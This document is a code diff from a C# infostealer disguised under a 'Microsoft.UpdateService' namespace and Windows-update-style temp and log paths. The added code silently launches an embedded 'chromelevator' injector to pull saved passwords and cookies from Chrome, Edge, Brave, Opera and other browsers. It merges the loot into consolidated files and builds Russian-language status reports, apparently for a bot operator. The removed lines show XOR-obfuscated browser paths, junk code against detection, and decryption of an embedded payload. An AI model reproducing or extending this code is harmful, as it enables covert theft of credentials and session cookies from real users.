@@ -6,201 +6,209 @@ using System.Text;
 using System.Linq;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
+using System.IO.Compression;
 using Newtonsoft.Json.Linq;
 using Microsoft.Data.Sqlite;
 using FinalBot;
 using VanguardCore;
+using VanguardCore.Modules;
+using System.Diagnostics;
+using System.Threading;
 
 namespace Microsoft.UpdateService.Modules
 {
+    public class BrowserResult
+    {
+        public bool Success { get; set; }
+        public string Message { get; set; } = "";
+        public string OutputDir { get; set; } = "";
+        public string LogSnippet { get; set; } = "";
+        public int CookieCount { get; set; } = 0;
+        public int PasswordCount { get; set; } = 0;
+    }
+
     public class DataService
     {
-        // [POLY_JUNK]
-        private static void _vanguard_1750599b() {
-            int val = 83178;
-            if (val > 50000) Console.WriteLine("Hash:" + 83178);
-        }
-
-        private static string D(string s)
-        {
-            char[] c = s.ToCharArray();
-            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
-            return new string(c);
-        }
+        private string lastOutput = "";
+        private string lastError = "";
 
         private static void Log(string msg)
         {
-            string line = $"[{DateTime.Now:HH:mm:ss}] [BROWSER] {msg}";
-            Console.WriteLine(line);
-            string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
-            if (!Directory.Exists(logDir)) try { Directory.CreateDirectory(logDir); } catch { }
-            string logPath = Path.Combine(logDir, "svc_debug.log");
-            try { File.AppendAllText(logPath, line + "\n"); } catch { }
+            try {
+                string line = $"[{DateTime.Now:HH:mm:ss}] [BROWSER] {msg}";
+                Console.WriteLine(line);
+                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
+                if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
+                string logPath = Path.Combine(logDir, "svc_debug.log");
+                File.AppendAllText(logPath, line + Environment.NewLine);
+            } catch { }
         }
 
-        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-
-        private readonly Dictionary<string, string> _browserBasePaths;
-
-        public DataService()
+        public async Task<BrowserResult> RunCompleteSteal()
         {
-            _browserBasePaths = new Dictionary<string, string>
-            {
-                {"Chrome",     Path.Combine(_localAppData, D("Bjjbi`"), D("Fujhb"), D("Pvbo!Eaub"))},
-                {"Edge",       Path.Combine(_localAppData, D("Hlfwjvjcq"), D("@ab`"), D("Pvbo!Eaub"))},
-                {"EdgeBeta",   Path.Combine(_localAppData, D("Hlfwjvjcq"), D("@ab`!Gbud"), D("Pvbo!Eaub"))},
-                {"Brave",      Path.Combine(_localAppData, D("Gwdtb\x56jluzdob"), D("Gwdtb.Gwjzrbo"), D("Pvbo!Eaub"))},
-                {"Opera",      Path.Combine(_appData, D("Jqbwd!\x56jluzdob"), D("Jqbwd!\x56udkcb"))},
-                {"Opera GX",   Path.Combine(_appData, D("Jqbwd!\x56jluzdob"), D("Jqbwd!H]!\x56udkcb"))},
-                {"Yandex",     Path.Combine(_localAppData, D("Xdobz"), D("XdobzKwjzrbo"), D("Pvbo!Eaub"))},
-            };
-        }
-
-        public async Task<string> RunAll()
-        {
-            var reports = new List<string>();
+            var result = new BrowserResult();
             try
             {
-                string projectOutput = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Output");
-                if (!Directory.Exists(projectOutput)) Directory.CreateDirectory(projectOutput);
-                Log($"Output dir: {projectOutput}");
+                string tempBase = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
+                if (!Directory.Exists(tempBase)) Directory.CreateDirectory(tempBase);
+                
+                string vOutputDir = Path.Combine(tempBase, "VOutput");
+                if (Directory.Exists(vOutputDir)) try { Directory.Delete(vOutputDir, true); } catch { }
+                Directory.CreateDirectory(vOutputDir);
 
-                await RunChromelevator();
+                Log("[BROWSER] Starting Absolute Extraction...");
+                
+                // Phase 1: Run the actual injector
+                await RunChromelevator(vOutputDir);
 
-                string tempDir   = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
-                string vOutputDir = Path.Combine(tempDir, "VOutput");
+                // Phase 2: Search for results (Agessive Search)
+                string foundDir = "";
+                
+                // 1. Check specified VOutput
+                if (Directory.Exists(vOutputDir) && Directory.GetDirectories(vOutputDir).Length > 0)
+                    foundDir = vOutputDir;
+                
+                // 2. Check default 'output' in WorkDir (elevator might ignore -o if 'all' is used)
+                if (string.IsNullOrEmpty(foundDir)) {
+                    string alt1 = Path.Combine(ResourceModule.WorkDir, "output");
+                    if (Directory.Exists(alt1) && Directory.GetDirectories(alt1).Length > 0)
+                        foundDir = alt1;
+                }
+                
+                // 3. Check current dir 'output'
+                if (string.IsNullOrEmpty(foundDir)) {
+                    string alt2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "output");
+                    if (Directory.Exists(alt2) && Directory.GetDirectories(alt2).Length > 0)
+                        foundDir = alt2;
+                }
 
-                if (Directory.Exists(vOutputDir))
+                if (!string.IsNullOrEmpty(foundDir))
                 {
-                    Log($"VOutput found: {vOutputDir}");
-                    var allPassLines = new List<string> { "═══ 💎 ALL PASSWORDS REPORT 💎 ═══", $"Generated: {DateTime.Now:yyyy-MM-dd HH:mm:ss}", new string('═', 40), "" };
+                    // Consolidate files (Cookies/Passwords)
+                    var stats = ConsolidateData(foundDir);
+                    result.CookieCount = stats.cookies;
+                    result.PasswordCount = stats.passwords;
 
-                    int foundPassCount = 0;
-                    int foundCookieFiles = 0;
-                    var allCookieLines = new List<string>();
-
-                    var dirsToScan = new List<string> { vOutputDir };
-                    dirsToScan.AddRange(Directory.GetDirectories(vOutputDir, "*", SearchOption.AllDirectories));
-
-                    foreach (var dir in dirsToScan)
-                    {
-                        string dirName = Path.GetFileName(dir);
-                        string passFile = Path.Combine(dir, "passwords.txt");
-                        if (!File.Exists(passFile))
-                        {
-                            var passFiles = Directory.GetFiles(dir, "*password*", SearchOption.TopDirectoryOnly);
-                            if (passFiles.Length == 0) passFiles = Directory.GetFiles(dir, "*pass*", SearchOption.TopDirectoryOnly);
-                            if (passFiles.Length > 0) passFile = passFiles[0];
-                        }
-
-                        if (File.Exists(passFile))
-                        {
-                            var lines = File.ReadAllLines(passFile);
-                            if (lines.Length > 0)
-                            {
-                                int entries = lines.Count(l => l.StartsWith("pass ") || l.StartsWith("password:"));
-                                if (entries == 0) entries = lines.Length / 4;
-                                
-                                if (entries > 0 || lines.Length > 2)
-                                {
-                                    foundPassCount += entries;
-                                    if (dir != vOutputDir) allPassLines.Add($"🌐 === Browser: {dirName.ToUpper()} ===");
-                                    allPassLines.AddRange(lines);
-                                    allPassLines.Add("");
-                                }
-                            }
-                        }
-
-                        string[] cookieFiles2 = Directory.GetFiles(dir, "*cookie*", SearchOption.TopDirectoryOnly);
-                        string? actualCookieFile = File.Exists(Path.Combine(dir, "cookies.txt")) ? Path.Combine(dir, "cookies.txt") : (cookieFiles2.Length > 0 ? cookieFiles2[0] : null);
-                        
-                        if (actualCookieFile != null)
-                        {
-                            foundCookieFiles++;
-                            var cLines = File.ReadAllLines(actualCookieFile);
-                            if (cLines.Length > 0)
-                            {
-                                allCookieLines.Add($"# === {dirName} ===");
-                                allCookieLines.AddRange(cLines);
-                                allCookieLines.Add("");
-                            }
-                        }
-                    }
-
-                    string mergedPassPath = Path.Combine(vOutputDir, "All_Passwords.txt");
-                    string mergedCookiePath = Path.Combine(vOutputDir, "All_Cookies.txt");
-                    File.WriteAllLines(mergedPassPath, allPassLines, Encoding.UTF8);
-                    if (allCookieLines.Count > 0) File.WriteAllLines(mergedCookiePath, allCookieLines, Encoding.UTF8);
-
-                    File.Copy(mergedPassPath, Path.Combine(projectOutput, "All_Passwords.txt"), true);
-                    if (allCookieLines.Count > 0) File.Copy(mergedCookiePath, Path.Combine(projectOutput, "All_Cookies.txt"), true);
-
-                    if (foundPassCount > 0)
-                    {
-                        reports.Add($"✅ <b>Passwords captured:</b> ~{foundPassCount} entries.");
-                        reports.Add($"📁 Saved to: <code>Output\\All_Passwords.txt</code>");
-                    }
-                    if (foundCookieFiles > 0)
-                    {
-                        reports.Add($"🍪 <b>Cookies:</b> {foundCookieFiles} browser(s) captured.");
-                        reports.Add($"📁 Saved to: <code>Output\\All_Cookies.txt</code>");
-                    }
+                    var subDirs = Directory.GetDirectories(foundDir);
+                    var names = subDirs.Select(d => Path.GetFileName(d).ToUpper()).ToList();
+                    
+                    result.Success = true;
+                    result.OutputDir = foundDir;
+                    result.Message = $"📁 <b>Браузеры:</b> {string.Join(", ", names)}\n🍪 <b>Cookies:</b> {result.CookieCount}\n🔑 <b>Passwords:</b> {result.PasswordCount}";
+                    Log($"[BROWSER] Success! Found data in: {foundDir} (C:{result.CookieCount}, P:{result.PasswordCount})");
                 }
                 else
                 {
-                    reports.Add("❌ Browser extraction failed.");
+                    result.Success = false;
+                    string snippet = string.IsNullOrEmpty(lastOutput) ? (string.IsNullOrEmpty(lastError) ? "Экстрактор не вернул лог." : lastError) : lastOutput;
+                    if (snippet.Length > 300) snippet = "..." + snippet.Substring(snippet.Length - 300);
+                    
+                    result.Message = $"⚠️ <b>Ошибка сбора:</b> Данные не найдены.\n<code>{snippet.Replace("<", "&lt;").Replace(">", "&gt;")}</code>";
+                    Log("[BROWSER] Extraction failed or returned empty output.");
                 }
             }
             catch (Exception ex)
             {
-                reports.Add($"❌ Critical error: <code>{ex.Message}</code>");
+                result.Success = false;
+                result.Message = $"❌ <b>Критическая ошибка:</b> {ex.Message}";
+                Log($"[BROWSER] Exception: {ex}");
             }
-
-            return string.Join("\n", reports);
+            return result;
         }
 
-        private async Task RunChromelevator()
+        private (int cookies, int passwords) ConsolidateData(string rootDir)
         {
+            int totalCookies = 0;
+            int totalPasswords = 0;
+            var allCookies = new JArray();
+            var allPasswords = new StringBuilder();
+            allPasswords.AppendLine("================================================================================");
+            allPasswords.AppendLine("                           CONSOLIDATED PASSWORDS                               ");
+            allPasswords.AppendLine("================================================================================" + Environment.NewLine);
+
             try
             {
-                string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
-                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
-
-                string elevatorPath = Path.Combine(tempDir, "chromelevator.exe");
-                string outputDir    = Path.Combine(tempDir, "VOutput");
-
-                if (Directory.Exists(outputDir)) try { Directory.Delete(outputDir, true); } catch { }
-                Directory.CreateDirectory(outputDir);
-
-                if (!File.Exists(elevatorPath))
+                var files = Directory.GetFiles(rootDir, "*.*", SearchOption.AllDirectories);
+                foreach (var file in files)
                 {
-                    var assembly = System.Reflection.Assembly.GetExecutingAssembly();
-                    using Stream? stream = assembly.GetManifestResourceStream("FinalBot.chromelevator.bin");
-                    if (stream != null)
+                    string name = Path.GetFileName(file).ToLower();
+                    if (name == "cookies.json")
                     {
-                        using MemoryStream ms = new MemoryStream();
-                        stream.CopyTo(ms);
-                        byte[] encrypted = ms.ToArray();
-                        byte[] decrypted = AesHelper.Decrypt(encrypted);
-                        if (decrypted != null) File.WriteAllBytes(elevatorPath, decrypted);
+                        try {
+                            var json = JArray.Parse(File.ReadAllText(file));
+                            foreach (var item in json) allCookies.Add(item);
+                            totalCookies += json.Count;
+                        } catch { }
+                    }
+                    else if (name == "passwords.txt")
+                    {
+                        try {
+                            string content = File.ReadAllText(file);
+                            if (content.Contains("URL:")) {
+                                string browserName = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(file)) ?? "Unknown");
+                                allPasswords.AppendLine($"--- SOURCE: {browserName} ---");
+                                allPasswords.AppendLine(content);
+                                allPasswords.AppendLine(Environment.NewLine);
+                                
+                                // Basic regex to count credentials in passwords.txt
+                                totalPasswords += Regex.Matches(content, "URL:").Count;
+                            }
+                        } catch { }
                     }
                 }
 
-                var proc = new System.Diagnostics.Process
-                {
-                    StartInfo = new System.Diagnostics.ProcessStartInfo
-                    {
-                        FileName  = elevatorPath,
-                        Arguments = $"all --method nt -o \"{outputDir}\"",
-                        UseShellExecute        = false,
-                        CreateNoWindow         = true
-                    }
-                };
-                proc.Start();
-                await proc.WaitForExitAsync();
+                if (totalCookies > 0)
+                    File.WriteAllText(Path.Combine(rootDir, "all_cookies.json"), allCookies.ToString());
+                
+                if (totalPasswords > 0)
+                    File.WriteAllText(Path.Combine(rootDir, "all_passwords.txt"), allPasswords.ToString());
             }
-            catch { }
+            catch (Exception ex) { Log($"[BROWSER] Consolidation error: {ex.Message}"); }
+
+            return (totalCookies, totalPasswords);
+        }
+
+        private async Task RunChromelevator(string vOutputDir)
+        {
+            try
+            {
+                string workingDir = ResourceModule.WorkDir;
+                string elevatorPath = Path.Combine(workingDir, "chromelevator.exe");
+
+                if (!File.Exists(elevatorPath)) {
+                    Log($"[BROWSER] ERROR: {elevatorPath} not found!");
+                    return;
+                }
+
+                // Command: all [flags]
+                // V6.13: Ensure 'all' is the primary command
+                string args = $"all -k -o \"{vOutputDir}\"";
+                Log($"[BROWSER] Executing: {elevatorPath} {args}");
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = elevatorPath,
+                    Arguments = args,
+                    WorkingDirectory = workingDir,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    CreateNoWindow = true
+                };
+
+                using (Process? p = Process.Start(psi))
+                {
+                    if (p != null)
+                    {
+                        Process process = (Process)p;
+                        lastOutput = await process.StandardOutput.ReadToEndAsync();
+                        lastError = await process.StandardError.ReadToEndAsync();
+                        await process.WaitForExitAsync();
+                        Log($"[BROWSER] Elevator Exit Code: {process.ExitCode}");
+                    }
+                }
+            }
+            catch (Exception ex) { Log($"[BROWSER] RunChromelevator error: {ex.Message}"); }
         }
     }
 }
